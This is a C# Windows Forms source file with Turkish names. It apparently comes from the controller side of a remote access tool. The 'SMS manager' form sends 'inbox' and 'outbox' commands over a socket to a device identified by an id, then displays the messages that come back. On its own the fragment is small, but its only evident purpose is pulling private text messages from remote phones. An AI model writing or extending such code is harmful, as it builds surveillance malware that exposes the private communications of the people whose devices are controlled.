using System;
using System.Net.Sockets;
using System.Windows.Forms;

namespace SV
{
    public partial class SMSYoneticisi : Form
    {
        public string uniq_id = "";
        Socket sck;
        public SMSYoneticisi(Socket sock, string id)
        {
            InitializeComponent();
            sck = sock;
            uniq_id = id;
        }

        private void listView1_DoubleClick(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                try
                {
                    listView1.SelectedItems[0].ImageIndex = 1;
                    new Goruntule(listView1.SelectedItems[0].SubItems[1].Text,
                        listView1.SelectedItems[0].SubItems[2].Text).Show();
                }
                catch (Exception) { }
            }
        }

        private void gelenSMSToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                Form1.KomutGonder("GELENKUTUSU", "[VERI][0x09]", sck);
                Text = "Sms Yöneticisi";
            }
            catch (Exception) { }
        }

        private void gidenSMSToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                Form1.KomutGonder("GIDENKUTUSU", "[VERI][0x09]", sck);
                Text = "Sms Yöneticisi";
            }
            catch (Exception) { }
        }
    }
}
